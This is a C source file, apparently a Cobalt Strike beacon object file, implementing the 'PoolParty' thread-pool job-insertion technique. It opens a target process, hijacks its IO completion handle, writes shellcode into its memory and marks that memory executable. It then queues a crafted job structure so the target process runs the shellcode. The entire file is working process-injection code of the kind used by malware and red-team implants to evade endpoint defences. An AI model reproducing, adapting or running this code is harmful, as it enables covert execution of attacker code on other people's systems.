#include "PoolParty.h"

#define JOB_NAME_LENGTH 8
unsigned char POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH + 1];

void RemoteTpJobInsertionSetupExecution(HANDLE hTarget, LPVOID pShellcodeAddress) {
    _TpAllocJobNotification TpAllocJobNotification = (_TpAllocJobNotification)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "TpAllocJobNotification"));
    MSVCRT$srand((unsigned int)MSVCRT$time(NULL));
    
    for (int i = 0; i < JOB_NAME_LENGTH; ++i) {
        POOL_PARTY_JOB_NAME[i] = generateRandomLetter();
    }
    POOL_PARTY_JOB_NAME[JOB_NAME_LENGTH] = '\0';

    HANDLE p_hJob = KERNEL32$CreateJobObjectA(NULL, POOL_PARTY_JOB_NAME);
    if (p_hJob == NULL) {
        return;
    }

    PFULL_TP_JOB pTpJob = { 0 };
    NTSTATUS Ntstatus = TpAllocJobNotification(&pTpJob, p_hJob, pShellcodeAddress, NULL, NULL);
    if (!NT_SUCCESS(Ntstatus)) {
        return;
    }

    PFULL_TP_JOB RemoteTpJobAddress = (PFULL_TP_JOB)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    KERNEL32$WriteProcessMemory(hTarget, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), NULL);

    JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };
    KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

    JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
    JobAssociateCopmletionPort.CompletionPort = hIoCompletion;
    KERNEL32$SetInformationJobObject(p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

    KERNEL32$AssignProcessToJobObject(p_hJob, KERNEL32$GetCurrentProcess());
}

void Inject6(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));
    
    HANDLE hTarget = NULL;
    DWORD dwOldProtect = NULL;
    hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);
    
    if (hTarget) {
        HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
        
        PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
        KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
        
        RemoteTpJobInsertionSetupExecution(hTarget, pShellcodeAddress);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
    }

}
